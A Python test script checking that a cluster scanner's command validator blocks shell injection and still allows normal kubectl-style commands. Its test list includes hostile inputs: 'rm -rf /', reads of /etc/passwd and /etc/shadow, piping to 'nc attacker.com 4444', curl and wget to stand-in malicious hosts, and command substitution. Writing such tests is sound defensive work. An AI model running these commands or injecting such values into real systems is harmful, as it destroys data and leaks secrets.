#!/usr/bin/env python3
"""
Test script to verify command injection protection in ClusterScanner.
"""
import sys
import os

# Add the project root to Python path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.cluster_analyzer.scanner import ClusterScanner


def test_command_injection_protection():
    """Test that malicious commands are blocked."""
    scanner = ClusterScanner()
    
    # Test cases for command injection attempts
    malicious_commands = [
        # Command separators
        ["get", "nodes; rm -rf /tmp"],
        ["get", "nodes && cat /etc/passwd"],
        ["get", "nodes | nc attacker.com 4444"],
        
        # Command substitution
        ["get", "nodes $(whoami)"],
        ["get", "nodes`cat /etc/passwd`"],
        
        # Directory traversal
        ["get", "../../../etc/passwd"],
        
        # Shell special characters
        ["get", "nodes; curl http://evil.com"],
        ["get", "nodes`wget http://malicious.com`"],
        
        # Invalid flags with special chars
        ["get", "nodes", "-o=json; cat /etc/shadow"],
        
        # Resource name injection
        ["get", "pods; rm -rf /"],
        ["get", "configmap../../etc/passwd"],
    ]
    
    print("Testing command injection protection...")
    
    for i, malicious_cmd in enumerate(malicious_commands):
        print(f"\nTest {i+1}: {malicious_cmd}")
        
        # Test the validation method directly
        is_valid = scanner._validate_command_args(malicious_cmd)
        print(f"  Validation result: {'ALLOWED' if is_valid else 'BLOCKED'}")
        
        if is_valid:
            print("  ❌ SECURITY ISSUE: Malicious command was allowed!")
            return False
        else:
            print("  ✅ Good: Malicious command was blocked")
    
    print("\n" + "="*60)
    print("Testing legitimate commands still work...")
    
    # Test legitimate commands
    legitimate_commands = [
        ["get", "nodes", "-o", "json"],
        ["get", "storageclass", "-o", "json"],
        ["get", "crd", "-o", "json"],
        ["top", "nodes", "--no-headers"],
        ["cluster-info"],
        ["version", "--client"],
        ["adm", "top", "nodes", "--no-headers"],
        ["get", "pods", "-n", "default"],
        ["get", "services", "-l", "app=nginx"],
    ]
    
    for i, legit_cmd in enumerate(legitimate_commands):
        print(f"\nLegitimate test {i+1}: {legit_cmd}")
        
        is_valid = scanner._validate_command_args(legit_cmd)
        print(f"  Validation result: {'ALLOWED' if is_valid else 'BLOCKED'}")
        
        if not is_valid:
            print("  ⚠️  WARNING: Legitimate command was blocked!")
            print("  This might be too restrictive or needs whitelist adjustment")
        else:
            print("  ✅ Good: Legitimate command allowed")
    
    print("\n" + "="*60)
    print("Command injection protection test completed!")
    return True


def test_edge_cases():
    """Test edge cases for validation."""
    scanner = ClusterScanner()
    
    edge_cases = [
        # Empty args
        [],
        
        # Non-string elements
        ["get", 123],
        
        # Very long strings
        ["get", "a" * 1000],
        
        # Unicode characters
        ["get", "pods-ñame"],
        ["get", "测试"],
        
        # Mixed case flags
        ["GET", "nodes"],
        ["get", "NODES"],
    ]
    
    print("Testing edge cases...")
    
    for i, edge_case in enumerate(edge_cases):
        print(f"\nEdge case {i+1}: {edge_case}")
        try:
            is_valid = scanner._validate_command_args(edge_case)
            print(f"  Result: {'ALLOWED' if is_valid else 'BLOCKED'}")
        except Exception as e:
            print(f"  Exception: {e}")


if __name__ == "__main__":
    print("🔒 Testing ClusterScanner Command Injection Protection")
    print("="*60)
    
    success = test_command_injection_protection()
    test_edge_cases()
    
    if success:
        print("\n✅ Security tests passed!")
        print("Command injection protection is working correctly.")
        sys.exit(0)
    else:
        print("\n❌ Security tests failed!")
        print("Command injection protection needs to be fixed.")
        sys.exit(1)